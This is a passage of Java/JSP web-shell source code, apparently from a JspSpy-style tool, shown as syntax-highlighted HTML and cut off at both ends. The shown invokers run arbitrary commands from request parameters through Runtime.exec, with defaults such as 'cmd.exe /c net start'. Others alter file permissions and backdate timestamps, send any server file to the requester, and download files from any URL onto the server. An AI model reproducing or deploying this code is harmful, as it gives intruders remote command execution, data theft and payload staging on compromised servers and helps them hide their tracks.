class="built_in">minute</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">MINUTE</span>)+<span class="string">" id=\"</span><span class="built_in">minute</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"second:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">second</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">SECOND</span>)+<span class="string">" id=\"</span><span class="built_in">second</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">"&gt; &lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" value=\"</span>Back\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>button\<span class="string">" onclick=\"</span>history.back()\<span class="string">"&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> EditPropertyInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> f = <span class="built_in">request</span>.getParameter(<span class="string">"file"</span>);</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(f);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!file.exists())</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> read = <span class="built_in">request</span>.getParameter(<span class="string">"read"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> write = <span class="built_in">request</span>.getParameter(<span class="string">"write"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="keyword">execute</span> = <span class="built_in">request</span>.getParameter(<span class="string">"execute"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">year</span> = <span class="built_in">request</span>.getParameter(<span class="string">"year"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">month</span> = <span class="built_in">request</span>.getParameter(<span class="string">"month"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">date</span> = <span class="built_in">request</span>.getParameter(<span class="string">"date"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">hour</span> = <span class="built_in">request</span>.getParameter(<span class="string">"hour"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">minute</span> = <span class="built_in">request</span>.getParameter(<span class="string">"minute"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">second</span> = <span class="built_in">request</span>.getParameter(<span class="string">"second"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(read)) &#123;</span></span><br><span class="line"><span class="vbscript">file.setReadable(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">file.setReadable(<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(write)) &#123;</span></span><br><span class="line"><span class="vbscript">file.setWritable(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">file.setWritable(<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(<span class="keyword">execute</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">file.setExecutable(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">file.setExecutable(<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">Calendar cal = Calendar.getInstance();</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">YEAR</span>,Integer.parseInt(<span class="built_in">year</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">MONTH</span>,Integer.parseInt(<span class="built_in">month</span>)<span class="number">-1</span>);</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">DATE</span>,Integer.parseInt(<span class="built_in">date</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">HOUR</span>,Integer.parseInt(<span class="built_in">hour</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">MINUTE</span>,Integer.parseInt(<span class="built_in">minute</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">SECOND</span>,Integer.parseInt(<span class="built_in">second</span>));</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(file.setLastModified(cal.getTimeInMillis()))&#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Reset File Property Success!"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Reset File Property Failed!"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VShell</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VsInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> cmd = <span class="built_in">request</span>.getParameter(<span class="string">"command"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> program = <span class="built_in">request</span>.getParameter(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (cmd == <span class="literal">null</span>) cmd = <span class="string">"cmd.exe /c set"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (program == <span class="literal">null</span>) program = <span class="string">"cmd.exe /c net start &gt; "</span>+SHELL_DIR+<span class="string">"/Log.txt"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (JSession.getAttribute(MSG)!=<span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,JSession.getAttribute(MSG).toString());</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(MSG);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Execute Program &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>shell\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>program\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Parameter&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>program\<span class="string">" id=\"</span>program\<span class="string">" value=\""+program+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" value=\"</span><span class="keyword">Execute</span>\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Execute Shell &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>shell\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>command\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Parameter&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>command\<span class="string">" id=\"</span>command\<span class="string">" value=\""+cmd+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" value=\"</span><span class="keyword">Execute</span>\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ShellInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> type = <span class="built_in">request</span>.getParameter(<span class="string">"type"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (type.equals(<span class="string">"command"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vs"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;&lt;hr/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;pre&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> command = <span class="built_in">request</span>.getParameter(<span class="string">"command"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(command)) &#123;</span></span><br><span class="line"><span class="vbscript">Process pro = Runtime.getRuntime().exec(command);</span></span><br><span class="line"><span class="vbscript">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(pro.getInputStream()));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = reader.readLine();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (s != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(Util.htmlEncode(Util.getStr(s)));</span></span><br><span class="line"><span class="vbscript">s = reader.readLine();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">reader.close();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/pre&gt;&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> program = <span class="built_in">request</span>.getParameter(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(program)) &#123;</span></span><br><span class="line"><span class="vbscript">Process pro = Runtime.getRuntime().exec(program);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Program Has Run Success!"</span>);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vs"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DownInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path  = <span class="built_in">request</span>.getParameter(<span class="string">"path"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(path)) </span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.exists()) </span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setHeader(<span class="string">"Content-Disposition"</span>,<span class="string">"attachment;filename="</span>+URLEncoder.encode(f.getName(),PAGE_CHARSET));</span></span><br><span class="line"><span class="vbscript">BufferedInputStream input = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(f));</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream output = <span class="keyword">new</span> BufferedOutputStream(<span class="built_in">response</span>.getOutputStream());</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = input.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">output.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = input.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">input.close();</span></span><br><span class="line"><span class="vbscript">output.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VDown</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VdInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> savepath = <span class="built_in">request</span>.getParameter(<span class="string">"savepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> url = <span class="built_in">request</span>.getParameter(<span class="string">"url"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(url))</span></span><br><span class="line"><span class="vbscript">url = <span class="string">"http://www.forjj.com/"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(savepath)) &#123;</span></span><br><span class="line"><span class="vbscript">savepath = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(JSession.getAttribute(<span class="string">"done"</span>))) &#123;</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,<span class="string">"Download Remote File Success!"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Remote File DownLoad &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>downRemote\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Remote File URL:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input class=\"</span>input\<span class="string">" name=\"</span>url\<span class="string">" value=\""+url+"</span>\<span class="string">" id=\"</span>url\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">70</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Save Path:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>savepath\<span class="string">" id=\"</span>savepath\<span class="string">" value=\""+savepath+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">70</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>connect\<span class="string">" id=\"</span>connect\<span class="string">" value=\"</span>DownLoad\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DownRemoteInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> downFileUrl = <span class="built_in">request</span>.getParameter(<span class="string">"url"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> savePath = <span class="built_in">request</span>.getParameter(<span class="string">"savepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(downFileUrl) || Util.<span class="built_in">isEmpty</span>(savePath))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">URL downUrl = <span class="keyword">new</span> URL(downFileUrl);</span></span><br><span class="line"><span class="vbscript">URLConnection conn = downUrl.openConnection();</span></span><br><span class="line"><span class="vbscript">BufferedInputStream <span class="keyword">in</span> = <span class="keyword">new</span> BufferedInputStream(conn.getInputStream());</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream out = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(savePath)));</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="keyword">in</span>.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = <span class="keyword">in</span>.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.close();</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"d"</span>);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vd"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> IndexInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"filelist"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MkDirInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> name = <span class="built_in">request</span>.getParameter(<span class="string">"name"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(name);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.isAbsolute()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!path.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">path += <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">path += name;</span></span><br><span class="line"><span class="vbscript">f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">f.mkdirs();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Make Directory Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MoveInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse 